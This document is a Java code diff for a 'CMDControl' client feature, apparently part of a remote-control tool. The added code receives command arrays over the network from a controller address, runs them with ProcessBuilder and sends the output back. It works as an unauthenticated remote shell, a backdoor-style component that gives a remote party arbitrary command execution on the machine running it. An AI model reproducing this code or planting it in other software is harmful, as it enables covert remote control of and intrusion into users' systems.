@@ -1,21 +1,20 @@
 package Client.Features;
 
+import Handler.Message;
 import Handler.PacketHandler;
 import Tools.Network.NetworkInterface;
 
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.OutputStream;
-import java.util.Arrays;
 
+import static Tools.IConstants.BUFFER_SIZE;
 import static Tools.Network.NetworkInterface.Sleep;
 
 public class CMDControl extends Feature {
 
     private InputStream is;
-    private OutputStream os;
 
-    private byte[] buffer;
+    private String[] old;
 
     public CMDControl(PacketHandler packetHandler) {
         super(packetHandler);
@@ -32,30 +31,51 @@ public class CMDControl extends Feature {
         thread.execute(run());
     }
 
-    public void setReceivedBuffer(byte[] buffer){
-        this.buffer = buffer;
-    }
-
     @Override
     protected Runnable run() {
         return () -> {
             while (running) {
                 try {
-                    Sleep(1000/60);
 
-                    if(buffer.length == 0 || buffer[0] == 0 || buffer[0] != NetworkInterface.CommandByte.CHAT_BYTE) continue;
+                    byte[] buffer = packetHandler.receive(BUFFER_SIZE, packetHandler.getAddress(), packetHandler.getPort());
 
-                    String[] arr = (String[]) objectHandler.readModifiedObjects(buffer).get();
-                    System.out.println(Arrays.toString(arr));
-                    Process p = new ProcessBuilder(arr).start();
+                    Sleep(1000 / 60);
 
-                    is = p.getInputStream();
-                    os = p.getOutputStream();
+                    if (buffer.length == 0 || buffer[0] == 0 || buffer[0] != NetworkInterface.CommandByte.CHAT_BYTE)
+                        continue;
+
+                    String[] input = (String[]) objectHandler.readModifiedObjects(buffer).get();
+                    if (input == null) continue;
+
+                    if(!sameArray(input, old) && !input[0].equals("")){
+                        Process p = new ProcessBuilder(input).start();
+                        is = p.getInputStream();
+                        System.out.println("Process done!");
+                        String inputStreamString = new String(is.readAllBytes());
+                        System.out.println(inputStreamString);
+                        Message<String> response = () -> inputStreamString;
+                        byte[] data = objectHandler.writeObjects(response);
+                        byte[] dataWithId = objectHandler.writeModifiedArray(data, NetworkInterface.CommandByte.CMDCONTROL_BYTE);
+                        packetHandler.send(dataWithId, dataWithId.length, packetHandler.getAddress(), packetHandler.getPort());
+                    }
+                    old = input;
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
             }
         };
+    }
+
+    private boolean sameArray(Object[] obj1, Object[] obj2){
+        if(obj1 == null || obj2 == null) return false;
+        if(obj1.length != obj2.length) return false;
+        int counter = 0;
+        for(int i = 0; i < obj1.length; i++){
+            if(obj1[i].equals(obj2[i])){
+                counter++;
+            }
+        }
+        return counter == obj1.length;
     }
 
     @Override
